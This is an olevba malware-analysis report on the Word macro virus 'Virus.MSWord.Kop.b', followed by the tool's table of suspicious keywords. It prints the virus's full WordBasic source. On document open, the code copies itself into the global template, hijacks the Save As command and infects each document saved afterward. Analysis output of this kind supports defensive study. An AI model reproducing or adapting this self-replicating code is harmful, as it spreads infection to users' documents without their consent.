olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kop.b-d896ba2f96b5a419b59073bf080f65ab90aefabf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kop.b-d896ba2f96b5a419b59073bf080f65ab90aefabf - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Kop.b-d896ba2f96b5a419b59073bf080f65ab90aefabf - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
        WordBasic.Call "kopieren"
End Sub
-------------------------------------------------------------------------------
VBA MACRO kopieren.bas 
in file: Virus.MSWord.Kop.b-d896ba2f96b5a419b59073bf080f65ab90aefabf - OLE stream: 'Macros/VBA/kopieren'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
    
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":testmakro", "Global:DateiSpeichernUnter", 1
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "Global:AutoOpenDot", 1
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":kopieren", "Global:kopieren", 1

End Sub
-------------------------------------------------------------------------------
VBA MACRO testmakro.bas 
in file: Virus.MSWord.Kop.b-d896ba2f96b5a419b59073bf080f65ab90aefabf - OLE stream: 'Macros/VBA/testmakro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Cnt
Dim Founded
    Dim dbox As Object: Set dbox = WordBasic.DialogRecord.FileSaveAs(False)         'define Dialog box
    WordBasic.CurValues.FileSaveAs dbox                 'initialize and run dialog box
    
    On Error GoTo -1: On Error GoTo Ende                    'Call Exception Handle "Exit"
    WordBasic.Dialog.FileSaveAs dbox
    If ((dbox.Format = 0) Or (dbox.Format = 1)) Then  'Save only Macros in                                                Files with the end                                                  *.dot, *.doc
        For Cnt = 1 To WordBasic.CountMacros(0) 'Count virulent macros
            If WordBasic.[MacroName$](Cnt, 0, 1) = "AutoOpen" Then
                Founded = Founded + 1
            ElseIf WordBasic.[MacroName$](Cnt, 0, 1) = "kopieren" Then
                Founded = Founded + 1
            ElseIf WordBasic.[MacroName$](Cnt, 0, 1) = "testmakro" Then
                Founded = Founded + 1
            End If
        Next Cnt

        If Founded = 3 Then
            WordBasic.MsgBox "Dokument mit den Makros schon infiziert !"
            WordBasic.FileSaveAs dbox
        Else

            WordBasic.MacroCopy "Global:AutoOpenDot", WordBasic.[WindowName$]() + ":AutoOpen", 1
            WordBasic.MacroCopy "Global:kopieren", WordBasic.[WindowName$]() + ":kopieren", 1
            WordBasic.MacroCopy "Global:DateiSpeichernUnter", WordBasic.[WindowName$]() + ":testmakro", 1
            dbox.Format = 1                 'transform File in a                                                 template
            WordBasic.FileSaveAs dbox       'save the File
End If
 
Ende:                                   'End Sub if "Exit"
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

